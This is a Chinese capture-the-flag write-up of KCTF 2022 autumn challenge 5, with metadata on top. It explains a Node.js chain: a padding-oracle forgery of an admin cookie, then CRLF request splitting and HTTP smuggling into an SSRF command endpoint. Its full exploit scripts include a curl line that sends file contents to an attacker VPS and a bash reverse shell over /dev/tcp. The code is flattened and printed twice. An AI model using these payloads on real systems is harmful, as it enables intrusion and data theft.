---
title: 看雪2022 KCTF 秋季赛 | 第五题设计思路及解析
contest: 看雪2022 KCTF秋季赛
year: 2022
difficulty: hard
vuln_type: ssrf
tags:
- Node.js 8
- Padding Oracle
- http.get CRLF拆分
- HTTP走私
- /C00mmmmanD命令执行
- kctf.js
attack_chain: 主页拿isadmin cookie→/admin检测非admin→padding oracle伪造admin=1→CRLF拆分GET/POST→HTTP走私到/C00mmmmanD→SSRF打命令cat kctf.js|grep flag|base64
key_payload: 'padding_oracle.py;json_alphabet;CRLF=u010du010a;BLANK=u0120;content-length: 75;cmd=curl%20vps:port?`cat%20kctf.js%7Cgrep%20flag%7Cbase64`;Content-Length: 72;cmd=bash -c "bash -i >%2526 /dev/tcp/ip/port 0>%25261"'
one_liner: KCTF2022秋Q5《灾荒蔓延》Web：Node.js 8 padding oracle伪造admin+CRLF HTTP走私到/C00mmmmanD执行命令
lesson: Node 8低版本http.get存在CRLF拆分；CBC+PKCS7+padding oracle可伪造任意明文；HTTP走私打SSRF
quality: high
full_path: 看雪2022_KCTF_秋季赛_-_第五题设计思路及解析.full.md
meta_path: 看雪2022_KCTF_秋季赛_-_第五题设计思路及解析.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 看雪2022 KCTF 秋季赛 | 第五题设计思路及解析。KCTF2022秋Q5《灾荒蔓延》Web：Node.js 8 padding oracle伪造admin+CRLF HTTP走私到/C00mmmmanD执行命令。经验：Node 8低版本http.get存在CRLF拆分；CBC+PKCS7+padding oracle可伪造任意明文；HT...
category: web
subcategory: web_other
tools_used:
- Python
- curl
time_required: long
difficulty_score: 4
code_blocks_count: 2
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/81346.html
reasoning_chain:
- 触发：主页给 isadmin cookie + /admin 提示非 admin
- 假设：CBC+PKCS7 + padding oracle → 动作：padding_oracle.py
- 假设：伪造 admin=1 cookie → 观察：访问 /admin 通过
- 假设：Node.js 8 http.get CRLF 拆分 → 动作：CRLF=u010du010a 替换
- 假设：HTTP 走私到 /C00mmmmanD → 动作：content-length 75 + POST cmd
- 假设：cmd=curl%20vps:port?`cat%20kctf.js%7Cgrep%20flag%7Cbase64` → 反弹
- 观察：base64 解码 → flag
failed_attempts:
- 试图伪造任意 cookie 内容 → 失败：padding oracle 仅能解特定密文
- 试图用新版 Node.js 漏洞 → 失败：题目锁定 8 版本
- 试图直接调 /C00mmmmanD → 失败：IP 不在白名单
key_observations:
- Node.js 8 低版本 http.get 存在 CRLF 拆分漏洞
- CBC+PKCS7+padding oracle 可伪造任意明文
- HTTP 走私打 SSRF + 命令执行
- /C00mmmmanD 是隐藏命令执行端点
- bash -i >& /dev/tcp/ip/port 是反弹 shell 经典
prerequisites:
- Padding Oracle Attack 原理
- HTTP 走私（CRLF 注入 + Content-Length 差异）
- Node.js 8 http.get 漏洞（CVE-2018-12116 类）
- bash 反弹 shell 语法 + curl SSRF 外带
---
# 看雪2022 KCTF 秋季赛 | 第五题设计思路及解析

> 原文: https://www.ctfiot.com/81346.html
> ID: 81346

看雪 2022 KCTF秋季赛 已于11月15日中午12点正式开始！比赛延续上一届的模式并进行优化，对每道题设置了难度值、火力值、精致度等多类积分，用规则引导题目的难度和趣味度。大家请注意：签到题（https://ctf.pediy.com/game-season_fight-216.htm）将持续开放，整个比赛期间均可提交答案，获得积分哦～

今日中午12点，第五题《灾荒蔓延》已截止答题。本题围观人数共1k+，攻破战队数：2，分别是【98k】和【摸鱼划水打酱油】

下面一起看看该赛题的设计思路和相关解析吧~

出题团队简介

第五题《灾荒蔓延》出题方 星盟一分队玄机 战队，战队成员id：Achillesweb

赛题设计思路

作者（Achilles）来自星盟安全团队。

这是一个node项目，题目需要比赛者ssrf进而命令执行获得藏在比赛题目源代码中的flag。黑盒，不给源代码附件。

先访问/admin，发现它是解密cookie判断是不是管理员，用padding oracle attack伪造管理员cookie
http.get函数在node的8版本（其中的较低版本）或者更低版本存在被http拆分攻击危险。攻击者通过这个漏洞可以达到http走私的效果。
通过走私满足/C00mmmmanD对ip的要求，从而命令执行
下面是一把梭脚本，注意把这个脚本放在这个项目https://github.com/pspaul/padding-oracle文件夹里面。这个脚本执行的命令是
```bashcurl xxxx:
xxx/?`cat kctf.js|grep flag|base64`

# -*- coding: utf-8 -*-import urllib.parsefrom http.cookies import SimpleCookieimport requests
from padding_oracle import PaddingOracle
from optimized_alphabets import json_alphabet
attackIP = ""attackPort = ""vpsIP = ""vpsPort = ""
def payload_encode(raw): payload = raw.replace('n', 'u010du010a') .replace('+', 'u012b') .replace(' ', 'u0120') .replace('"', 'u0122') .replace("'", 'u0a27') .replace('[', 'u015b') .replace(']', 'u015d') .replace('`', 'u0127') .replace('"', 'u0122') .replace("'", 'u0a27') .replace('[', 'u015b') .replace(']', 'u015d') return payload
def oracle(cipher_hex): headers = {'Cookie':"isadmin={}".format(cipher_hex)} r = requests.get("http://"+attackIP+":"+attackPort+"/admin",headers = headers) response = r.content if b"Decrypt error" not in response: return True else: return False
def step1(): r = requests.get(url="http://"+attackIP+":"+attackPort) cookie = SimpleCookie(r.headers['Set-Cookie']) cookie = cookie["isadmin"].value return cookie
def step2(cipher): o = PaddingOracle(oracle, max_retries=-1) plain, _ = o.decrypt(cipher, optimized_alphabet=json_alphabet()) plain_new = b"{"admin":"1"}" cipher_new = o.craft(cipher, plain, plain_new) return cipher_new
def step3(new_cookie): payload = " HTTP/1.1nnPOST /C00mmmmanD HTTP/1.1nHost: 127.0.0.1nCookie: isadmin={}nConnection: closenContent-Type: application/x-www-form-urlencodednContent-Length: 75nncmd=curl%20"+vpsIP+"%3A"+vpsPort+"%3F%60cat%20kctf.js%7Cgrep%20flag%7Cbase64%60nnGET / HTTP/1.1ntest:" payload = payload.format(new_cookie) payload = payload_encode(payload) r = requests.get("http://"+attackIP+":"+attackPort+"/search?url=http://127.0.0.1:"+attackPort+"/" + urllib.parse.quote(payload))

if __name__ == "__main__": cookie = step1() new_cookie = step2(cookie) step3(new_cookie)

赛题解析

访问主页会给一个 isadmin 的 cookie, 带上此 cookie 直接访问 /admin, 发现提示不是 admin。

对 cookie 最后一位修改后提示 decrypt error, 再结合 unhexlify 后长度 32, 可以猜出是分块加密。

然后修改第一位, 提示 json parse error, 那么可以得知大概率是 CBC 模式 + PKCS7 Padding。

import binascii import requests # https://github.com/mwielgoszewski/python-paddingoracle
from paddingoracle import PaddingOracle, BadPaddingException class PadBuster(PaddingOracle): def __init__(self, session: requests.Session, wait: float = 0.1, **kwargs): super(PadBuster, self).__init__(**kwargs) self.session = session self.wait = wait def oracle(self, data, **kwargs): token = binascii.hexlify(data).decode() resp = None while True: try: resp = self.session.get('http://150.158.18.137:
5329/admin', cookies={ 'isadmin': token }) break 
except requests.HTTPError: # time.sleep(self.wait) continue self.history.append(resp) if 'Decrypt error' not in resp.text: return else: raise BadPaddingException sess = requests.session()pad_buster = PadBuster(sess) ct = binascii.unhexlify('b60bdcada90e7c628b68d0ed965363858dc1695757156638e9b86ac59c99e7c2')print(len(ct))print(ct) # admin_token = pad_buster.decrypt(ct[16:], block_size=16, iv=ct[:16])
# print(admin_token)
# b'{"admin":"0"}x03x03x03' iv = bytearray(ct[:16])iv[10] = iv[10] ^ ord('0') ^ ord('1') print(binascii.hexlify(bytes(iv) + ct[16:]))

通过 padding oracle 可以解出是 {“admin”:”0″}x03x03x03, 那么直接构造 iv 使得 CBC 解密出来 admin 为 1 即可。

使用构造的 cookie 访问 /admin, 提示 post cmd 到 /C00mmmmanD. 但是此时即使带上 isadmin cookie 访问 /C00mmmmanD 却还提示不是 admin, 那么大概率要结合一开始的 /search 的接口来 SSRF。

但是 search 只能发送 GET 请求, 由 Http banner 可以得知服务器是 express, 搜索 node 的 CRLF, 可以搜到 https://xz.aliyun.com/t/2894直接用同样的方法测试可以利用, 那么直接构造请求 POST /C00mmmmanD 即可。

import requests sess = requests.session() CRLF = 'č̊'BLANK = '̠' r = f'''1 HTTP/1.1Cookie: isadmin=b60bdcada90e7c628b68d1ed965363858dc1695757156638e9b86ac59c99e7c2Connection: keep-aliveHost: 127.0.0.1 POST /C00mmmmanD HTTP/1.1Host: 127.0.0.1User-Agent: curl/7.86.0Accept: */*Connection: closeCookie: isadmin=b60bdcada90e7c628b68d1ed965363858dc1695757156638e9b86ac59c99e7c2Content-Type: application/x-www-form-urlencodedContent-Length: 72 cmd=bash -c "bash -i >%2526 /dev/tcp/ip/port 0>%25261" '''.replace('n', CRLF).replace(' ', BLANK) # 记得修改 Content-Lengthprint(r)r = sess.get('http://150.158.18.137:
5329/search?url=http://127.0.0.1:
5329/C00mmmmanD?a=' + r) print(r.text)

第六题《病疫先兆》比赛正在进行

欢迎参与和围观

– End –

球分享

球点赞

球在看

戳“阅读原文”查看详情！


```
先访问/admin，发现它是解密cookie判断是不是管理员，用padding oracle attack伪造管理员cookie
http.get函数在node的8版本（其中的较低版本）或者更低版本存在被http拆分攻击危险。攻击者通过这个漏洞可以达到http走私的效果。
通过走私满足/C00mmmmanD对ip的要求，从而命令执行
下面是一把梭脚本，注意把这个脚本放在这个项目https://github.com/pspaul/padding-oracle文件夹里面。这个脚本执行的命令是
```bashcurl xxxx:
xxx/?`cat kctf.js|grep flag|base64`
# -*- coding: utf-8 -*-import urllib.parsefrom http.cookies import SimpleCookieimport requests
from padding_oracle import PaddingOracle
from optimized_alphabets import json_alphabet
attackIP = ""attackPort = ""vpsIP = ""vpsPort = ""
def payload_encode(raw): payload = raw.replace('n', 'u010du010a') .replace('+', 'u012b') .replace(' ', 'u0120') .replace('"', 'u0122') .replace("'", 'u0a27') .replace('[', 'u015b') .replace(']', 'u015d') .replace('`', 'u0127') .replace('"', 'u0122') .replace("'", 'u0a27') .replace('[', 'u015b') .replace(']', 'u015d') return payload
def oracle(cipher_hex): headers = {'Cookie':"isadmin={}".format(cipher_hex)} r = requests.get("http://"+attackIP+":"+attackPort+"/admin",headers = headers) response = r.content if b"Decrypt error" not in response: return True else: return False
def step1(): r = requests.get(url="http://"+attackIP+":"+attackPort) cookie = SimpleCookie(r.headers['Set-Cookie']) cookie = cookie["isadmin"].value return cookie
def step2(cipher): o = PaddingOracle(oracle, max_retries=-1) plain, _ = o.decrypt(cipher, optimized_alphabet=json_alphabet()) plain_new = b"{"admin":"1"}" cipher_new = o.craft(cipher, plain, plain_new) return cipher_new
def step3(new_cookie): payload = " HTTP/1.1nnPOST /C00mmmmanD HTTP/1.1nHost: 127.0.0.1nCookie: isadmin={}nConnection: closenContent-Type: application/x-www-form-urlencodednContent-Length: 75nncmd=curl%20"+vpsIP+"%3A"+vpsPort+"%3F%60cat%20kctf.js%7Cgrep%20flag%7Cbase64%60nnGET / HTTP/1.1ntest:" payload = payload.format(new_cookie) payload = payload_encode(payload) r = requests.get("http://"+attackIP+":"+attackPort+"/search?url=http://127.0.0.1:"+attackPort+"/" + urllib.parse.quote(payload))

if __name__ == "__main__": cookie = step1() new_cookie = step2(cookie) step3(new_cookie)
import binascii import requests # https://github.com/mwielgoszewski/python-paddingoracle
from paddingoracle import PaddingOracle, BadPaddingException class PadBuster(PaddingOracle): def __init__(self, session: requests.Session, wait: float = 0.1, **kwargs): super(PadBuster, self).__init__(**kwargs) self.session = session self.wait = wait def oracle(self, data, **kwargs): token = binascii.hexlify(data).decode() resp = None while True: try: resp = self.session.get('http://150.158.18.137:
5329/admin', cookies={ 'isadmin': token }) break 
except requests.HTTPError: # time.sleep(self.wait) continue self.history.append(resp) if 'Decrypt error' not in resp.text: return else: raise BadPaddingException sess = requests.session()pad_buster = PadBuster(sess) ct = binascii.unhexlify('b60bdcada90e7c628b68d0ed965363858dc1695757156638e9b86ac59c99e7c2')print(len(ct))print(ct) # admin_token = pad_buster.decrypt(ct[16:], block_size=16, iv=ct[:16])
# print(admin_token)
# b'{"admin":"0"}x03x03x03' iv = bytearray(ct[:16])iv[10] = iv[10] ^ ord('0') ^ ord('1') print(binascii.hexlify(bytes(iv) + ct[16:]))
import requests sess = requests.session() CRLF = 'č̊'BLANK = '̠' r = f'''1 HTTP/1.1Cookie: isadmin=b60bdcada90e7c628b68d1ed965363858dc1695757156638e9b86ac59c99e7c2Connection: keep-aliveHost: 127.0.0.1 POST /C00mmmmanD HTTP/1.1Host: 127.0.0.1User-Agent: curl/7.86.0Accept: */*Connection: closeCookie: isadmin=b60bdcada90e7c628b68d1ed965363858dc1695757156638e9b86ac59c99e7c2Content-Type: application/x-www-form-urlencodedContent-Length: 72 cmd=bash -c "bash -i >%2526 /dev/tcp/ip/port 0>%25261" '''.replace('n', CRLF).replace(' ', BLANK) # 记得修改 Content-Lengthprint(r)r = sess.get('http://150.158.18.137:
5329/search?url=http://127.0.0.1:
5329/C00mmmmanD?a=' + r) print(r.text)
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]